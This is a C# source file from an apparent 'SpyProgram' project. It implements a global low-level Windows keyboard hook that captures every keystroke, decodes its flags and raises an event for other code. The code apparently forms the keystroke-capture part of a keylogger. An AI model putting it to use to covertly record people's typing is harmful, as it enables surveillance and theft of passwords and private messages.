using System;
using System.Runtime.InteropServices;
using static SpyProgram.Windows.WINAPI.User32;
using static SpyProgram.Windows.WINAPI.WindowsAPIHelper;

namespace SpyProgram.Windows.WINAPI
{
    public class LowLevelKeyboardHook
    {
        public enum KeyStatus
        {
            Pressed,
            Released
        }

        public enum KeyInjectionType
        {
            NonInjected,
            LowIntegrityInjected,
            Injected
        }

        public delegate void HookStuff(uint key, KeyInjectionType injectionType, bool isExtendedKey, bool isAltPressed, KeyStatus keyStatus);
        public event HookStuff HookActivated;

        private HookProc procedure;
        private IntPtr hookId = IntPtr.Zero;
        
        public LowLevelKeyboardHook()
        {
            procedure = HookProcedureCallback;
        }

        public void Hook()
        {
            IntPtr moduleHandle = GetCurrentProccessModuleHandle();    
            hookId = SetWindowsHookEx(HookType.WH_KEYBOARD_LL, procedure, moduleHandle, 0);
        }

        public void UnHook()
        {
            if (hookId.Equals(IntPtr.Zero))
            {
                throw new InvalidOperationException("Cannot unhook what is not hooked.");
            }            

            bool isSuccessfullyUnhooked = UnhookWindowsHookEx(hookId);
            if (!isSuccessfullyUnhooked)
            {
                throw new Exception("Failed to unhook"); // TODO: Make custom exception
            }

            hookId = IntPtr.Zero;
        }

        private int HookProcedureCallback(int code, IntPtr wParam, IntPtr lParam)
        {
            if (code < 0)
            {
                return CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
            }

            KeyFlag flag = (KeyFlag)wParam;
            KBDLLHOOKSTRUCT hookStruct = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);

            uint key = hookStruct.virtualKeyCode;
            bool isExtendedKey;
            bool isAltPressed;
            KeyStatus keyStatus;
            KeyInjectionType injectionType;
            DateTime timeStamp = new DateTime(hookStruct.time);

            uint bit1 = (hookStruct.flags & 0b1);
            uint bit2 = (hookStruct.flags & 0b10) >> 1;
            uint bit5 = (hookStruct.flags & 0b10000) >> 4;
            uint bit6 = (hookStruct.flags & 0b100000) >> 5;
            uint bit8 = (hookStruct.flags & 0b10000000) >> 7;
            
            isExtendedKey = (bit1 == 1);
            isAltPressed = (bit6 == 1);
            keyStatus = (bit8 == 1) ? KeyStatus.Released : KeyStatus.Pressed;

            if (bit2 == 1)
                injectionType = KeyInjectionType.LowIntegrityInjected;
            else if (bit5 == 1)
                injectionType = KeyInjectionType.Injected;
            else
                injectionType = KeyInjectionType.NonInjected;

            HookActivated?.Invoke(
                key: key,
                injectionType: injectionType,
                isExtendedKey: isExtendedKey,
                isAltPressed: isAltPressed,
                keyStatus: keyStatus
            );

            return CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
        }

        
        private struct KBDLLHOOKSTRUCT
        {
            public uint virtualKeyCode;
            public uint scanCode;
            public uint flags;
            public uint time;
            public UIntPtr dwExtraInfo;
        }                

    }
}
